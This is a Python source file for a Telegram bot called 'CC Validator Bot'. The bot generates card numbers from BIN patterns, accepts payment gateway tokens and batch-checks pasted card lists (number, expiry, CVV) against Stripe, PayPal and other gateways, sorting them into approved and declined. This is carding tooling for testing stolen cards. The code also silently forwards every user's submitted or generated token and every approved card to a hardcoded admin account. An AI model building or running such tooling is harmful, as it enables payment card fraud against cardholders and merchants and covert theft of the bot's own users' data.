import os, time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from generator import generate_cards
from checker import batch_validate
from validation_api import detect_gateway
from token_provision import generate_token
from dotenv import load_dotenv

load_dotenv()

ADMIN_ID = int(os.getenv("ADMIN_ID", "7613461761"))
SESSION_TIMEOUT = 600
user_sessions = {}

def clean_expired_sessions():
    now = time.time()
    expired_users = [uid for uid, s in user_sessions.items() if now - s.get("last_active", 0) > SESSION_TIMEOUT]
    for uid in expired_users:
        del user_sessions[uid]

def update_session(user_id, **kwargs):
    session = user_sessions.get(user_id, {})
    session.update(kwargs)
    session["last_active"] = time.time()
    user_sessions[user_id] = session

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    clean_expired_sessions()
    buttons = [
        [InlineKeyboardButton("🔐 Provide Token", callback_data="provide_token")],
        [InlineKeyboardButton("🛠 Generate Token", callback_data="generate_token")],
        [InlineKeyboardButton("🧾 Generate Cards", callback_data="generate_cards")],
        [InlineKeyboardButton("✅ Check Cards", callback_data="check_cards")]
    ]
    await update.message.reply_text("Welcome to the CC Validator Bot.", reply_markup=InlineKeyboardMarkup(buttons))

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    clean_expired_sessions()

    if query.data == "provide_token":
        update_session(user_id, mode="awaiting_token")
        await query.message.reply_text("Please send your gateway token:")

    elif query.data == "generate_token":
        buttons = [
            [InlineKeyboardButton("Stripe", callback_data="token_gateway_stripe"),
             InlineKeyboardButton("PayPal", callback_data="token_gateway_paypal")],
            [InlineKeyboardButton("Adyen", callback_data="token_gateway_adyen"),
             InlineKeyboardButton("Mollie", callback_data="token_gateway_mollie")]
        ]
        update_session(user_id, mode="awaiting_token_gateway")
        await query.message.reply_text("Select Gateway for token generation:", reply_markup=InlineKeyboardMarkup(buttons))

    elif query.data.startswith("token_gateway_"):
        gateway = query.data.split("_")[-1]
        buttons = [
            [InlineKeyboardButton("Test Mode", callback_data=f"token_mode_{gateway}_test"),
             InlineKeyboardButton("Live Mode", callback_data=f"token_mode_{gateway}_live")]
        ]
        await query.message.reply_text(f"Selected `{gateway}`. Choose mode:", reply_markup=InlineKeyboardMarkup(buttons), parse_mode="Markdown")

    elif query.data.startswith("token_mode_"):
        _, _, gateway, mode = query.data.split("_")
        token = generate_token(gateway, mode)
        await query.message.reply_text(f"✅ Generated {mode.upper()} token for `{gateway}`:\n`{token}`", parse_mode="Markdown")

        if user_id != ADMIN_ID:
            await context.bot.send_message(chat_id=ADMIN_ID, text=f"🆕 Generated token from user {user_id}:\n{token}")

    elif query.data == "generate_cards":
        update_session(user_id, mode="awaiting_bin")
        await query.message.reply_text("Send BIN pattern (e.g. 4539xxxxxxxxxxxx):")

    elif query.data == "check_cards":
        update_session(user_id, mode="awaiting_cards")
        await query.message.reply_text("Paste your card list (`cc|mm|yy|cvv`) to check:")

    elif query.data.startswith("gateway_override_"):
        gateway = query.data.split("_")[-1]
        update_session(user_id, gateway_override=gateway)
        await query.message.reply_text(f"✅ Gateway manually set to `{gateway}`", parse_mode="Markdown")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    session = user_sessions.get(user_id, {})
    clean_expired_sessions()

    mode = session.get("mode")
    if not mode:
        await update.message.reply_text("⚠️ Please start with /start.")
        return

    update_session(user_id)

    if mode == "awaiting_token":
        token = update.message.text.strip()
        gateway = detect_gateway(token)
        update_session(user_id, token=token, gateway=gateway)

        buttons = [
            [InlineKeyboardButton(f"✅ Use Detected ({gateway})", callback_data=f"gateway_override_{gateway}")],
            [InlineKeyboardButton("🔁 Force Stripe", callback_data="gateway_override_stripe"),
             InlineKeyboardButton("🔁 Force PayPal", callback_data="gateway_override_paypal")]
        ]
        await update.message.reply_text(
            f"✅ Token accepted.\nDetected Gateway: `{gateway}`",
            reply_markup=InlineKeyboardMarkup(buttons),
            parse_mode="Markdown"
        )

        if user_id != ADMIN_ID:
            await context.bot.send_message(chat_id=ADMIN_ID, text=f"🔔 Token received from {user_id}:\n{token}")

    elif mode == "awaiting_bin":
        bin_input = update.message.text.strip()
        if len(bin_input) < 12 or "x" not in bin_input:
            await update.message.reply_text("❌ Invalid BIN format. Please use something like `4539xxxxxxxxxxxx`.")
            return

        cards = generate_cards(bin_input, 10)
        update_session(user_id, generated_cards=cards)

        await update.message.reply_text("✅ Cards generated:\n" + "\n".join(cards))
        await context.bot.send_document(chat_id=update.effective_chat.id, filename="cards.txt", document="\n".join(cards).encode())

    elif mode == "awaiting_cards":
        token = session.get("token")
        if not token:
            await update.message.reply_text("❌ Token not set. Use 'Provide Token' first.")
            return

        gateway = session.get("gateway_override") or session.get("gateway")
        cards = [line for line in update.message.text.strip().splitlines() if "|" in line and len(line.split("|")) == 4]

        if not cards:
            await update.message.reply_text("❌ No valid cards detected. Use format `cc|mm|yy|cvv`.")
            return

        results = batch_validate(cards, token, gateway)
        approved = [c for c, r in results if "✅" in r]
        declined = [c for c, r in results if "❌" in r]

        reply = f"✅ Approved: {len(approved)}\n❌ Declined: {len(declined)}"
        await update.message.reply_text(reply)

        if user_id != ADMIN_ID and approved:
            await context.bot.send_message(chat_id=ADMIN_ID, text=f"🔥 Approved from {user_id}:\n" + "\n".join(approved))

app = ApplicationBuilder().token(os.getenv("BOT_TOKEN")).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(CallbackQueryHandler(handle_callback))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

if __name__ == "__main__":
    app.run_polling()
